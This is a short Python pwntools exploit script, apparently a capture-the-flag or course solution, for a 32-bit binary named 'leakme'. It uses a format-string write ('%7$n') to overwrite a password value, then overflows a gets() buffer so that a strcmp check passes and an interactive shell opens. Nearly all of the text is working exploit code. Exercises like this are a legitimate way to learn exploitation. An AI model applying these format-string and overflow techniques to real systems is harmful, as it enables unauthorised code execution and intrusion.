"""
MD5 of Binary: d80a4c4f077437ac59896b8123719e53

Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
"""

'''
The program does a strcmp(RANDOM_STR, ebp-0x12), which errors if not equal.  
As we only have 12 bytes in our printf-vulnerable buffer, instead of leaking the contents of in RANDOM_STR, we can forcibly set it.  
We can then overflow gets(ebp-0x32) by 0x32-0x12 bytes, and write an 0x06.
Therefore the string comparison will return true, and we get a shell.
'''

from pwn import *
import re

p = process("./leakme")
# p = remote('plsdonthaq.me', 24102)

p.recvuntil("There is a password loaded at ")
address = int(p.recvuntil("...", drop=True), 16)

print(f"Address at {hex(address)}")

p.recv()

payload = b'..'
payload += p32(address)
payload += b'%7$n'

p.sendline(payload) # -> Write 6 into the random str
p.sendline(b'.' * (0x32 - 0x12) + b'\x06')

p.interactive()
